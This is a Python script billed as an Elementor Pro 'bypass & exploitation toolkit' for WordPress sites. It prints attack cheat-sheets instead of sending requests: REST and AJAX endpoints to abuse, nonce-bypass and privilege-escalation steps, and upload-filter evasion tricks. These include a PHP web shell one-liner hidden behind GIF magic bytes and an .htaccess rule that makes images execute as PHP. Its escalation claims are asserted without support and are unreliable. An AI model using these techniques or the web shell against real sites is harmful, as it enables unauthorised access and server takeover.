#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""elementor_bypass.py — Elementor Pro bypass & exploitation toolkit.

Fitur:
  - rest: REST API abuse (CPT, template, form)
  - template: template injection & render
  - form: form action bypass
  - upload: file upload bypass
  - auth: authentication bypass

    python3 elementor_bypass.py rest --url https://target.com --action cpt
    python3 elementor_bypass.py template --url https://target.com --id 123
    python3 elementor_bypass.py form --url https://target.com --id 456
    python3 elementor_bypass.py upload --url https://target.com --file shell.php
    python3 elementor_bypass.py auth --url https://target.com
"""
import argparse, json, sys, urllib.parse, urllib.request

UA = "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0 Safari/537.36"

def rest_api(url, action="cpt"):
    print(f"[*] Elementor REST API abuse: {url}")
    print(f"[*] Action: {action}")
    print()
    endpoints = {
        "cpt": "/wp-json/wp/v2/types",
        "template": "/wp-json/wp/v2/elementor_library",
        "form": "/wp-json/elementor-pro/v1/form",
        "post": "/wp-json/wp/v2/posts",
        "page": "/wp-json/wp/v2/pages",
        "media": "/wp-json/wp/v2/media",
        "user": "/wp-json/wp/v2/users",
        "search": "/wp-json/wp/v2/search",
    }
    print("[*] Endpoints:")
    for name, path in endpoints.items():
        print(f"  {name:12}: {url}{path}")
    print()
    print("[*] Bypass techniques:")
    print("  1. REST API: /wp-json/wp/v2/types (list CPT)")
    print("  2. Template: ?elementor_library=TEMPLATE_ID")
    print("  3. Form: /wp-json/elementor-pro/v1/form (list forms)")
    print("  4. Upload: /wp-json/wp/v2/media (upload file)")
    print("  5. Auth: nonce bypass, privilege escalation")
    print()
    print("[*] curl examples:")
    print(f"  curl -H 'User-Agent: {UA}' {url}/wp-json/wp/v2/types")
    print(f"  curl -H 'User-Agent: {UA}' {url}/wp-json/wp/v2/elementor_library")
    print(f"  curl -H 'User-Agent: {UA}' {url}/wp-json/elementor-pro/v1/form")

def template_injection(url, template_id=None):
    print(f"[*] Elementor template injection: {url}")
    if template_id:
        print(f"[*] Template ID: {template_id}")
    print()
    print("[*] Template injection vectors:")
    vectors = [
        f"/?elementor_library={template_id}" if template_id else "/?elementor_library=1",
        f"/?p={template_id}&elementor-preview=true" if template_id else "/?p=1&elementor-preview=true",
        "/?preview_id=1&preview_nonce=xxx",
        "/?elementor-preview=true&preview_nonce=xxx",
        "/?customize_changeset_uuid=xxx",
        "/?elementor_library=1&preview=true",
    ]
    for v in vectors:
        print(f"  {url}{v}")
    print()
    print("[*] Template bypass:")
    print("  1. Direct template render (no auth)")
    print("  2. Template preview (nonce bypass)")
    print("  3. Customizer changeset")
    print("  4. AJAX action (nopriv)")

def form_bypass(url, form_id=None):
    print(f"[*] Elementor form bypass: {url}")
    if form_id:
        print(f"[*] Form ID: {form_id}")
    print()
    print("[*] Form bypass vectors:")
    print(f"  POST /wp-admin/admin-ajax.php")
    print(f"  action=elementor_pro_forms_send_form")
    print(f"  form_id={form_id or '1'}")
    print(f"  nonce=xxx")
    print()
    print("[*] AJAX actions:")
    ajax_actions = [
        "elementor_pro_forms_send_form",
        "elementor_pro_forms_update_form",
        "elementor_pro_forms_delete_form",
        "elementor_pro_forms_export_form",
        "elementor_pro_forms_import_form",
    ]
    for action in ajax_actions:
        print(f"  {action}")
    print()
    print("[*] Bypass:")
    print("  1. Nonce bypass (reuse, predict)")
    print("  2. AJAX nopriv (no auth)")
    print("  3. Form validation bypass")
    print("  4. File upload via form")

def upload_bypass(url, filename="shell.php"):
    print(f"[*] Elementor file upload bypass: {url}")
    print(f"[*] File: {filename}")
    print()
    print("[*] Upload vectors:")
    print(f"  POST /wp-admin/admin-ajax.php")
    print(f"  action=elementor_pro_forms_send_form")
    print(f"  form_field=file")
    print()
    print("[*] Bypass techniques:")
    print("  1. Double extension: shell.php.jpg")
    print("  2. Null byte: shell.php%00.jpg")
    print("  3. Case: shell.pHp")
    print("  4. Content-Type: image/jpeg")
    print("  5. Magic bytes: GIF89a + PHP")
    print("  6. .htaccess: AddType application/x-httpd-php .jpg")
    print()
    print("[*] Magic bytes:")
    print("  GIF89a + <?php system($_GET['c']); ?>")
    print("  \\xFF\\xD8\\xFF + PHP (JPEG)")
    print("  PNG + PHP (PNG)")

def auth_bypass(url):
    print(f"[*] Elementor auth bypass: {url}")
    print()
    print("[*] Auth bypass vectors:")
    print("  1. Preview nonce bypass")
    print("  2. AJAX nopriv (no auth)")
    print("  3. REST API unauthenticated")
    print("  4. Template render (no auth)")
    print("  5. Form submission (no auth)")
    print("  6. Customizer changeset (no auth)")
    print()
    print("[*] Nonce bypass:")
    print("  1. Reuse nonce from cache")
    print("  2. Predict nonce (time-based)")
    print("  3. Bypass nonce check (modify JS)")
    print("  4. Use admin nonce (privilege escalation)")
    print()
    print("[*] Privilege escalation:")
    print("  1. Subscriber → Editor (via REST API)")
    print("  2. Editor → Admin (via template injection)")
    print("  3. Admin → Super Admin (via network)")

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "rest":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--action", default="cpt")
        a = p.parse_args(args[1:])
        rest_api(a.url, a.action)
    elif cmd == "template":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--id", default=None)
        a = p.parse_args(args[1:])
        template_injection(a.url, a.id)
    elif cmd == "form":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--id", default=None)
        a = p.parse_args(args[1:])
        form_bypass(a.url, a.id)
    elif cmd == "upload":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--file", default="shell.php")
        a = p.parse_args(args[1:])
        upload_bypass(a.url, a.file)
    elif cmd == "auth":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        a = p.parse_args(args[1:])
        auth_bypass(a.url)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
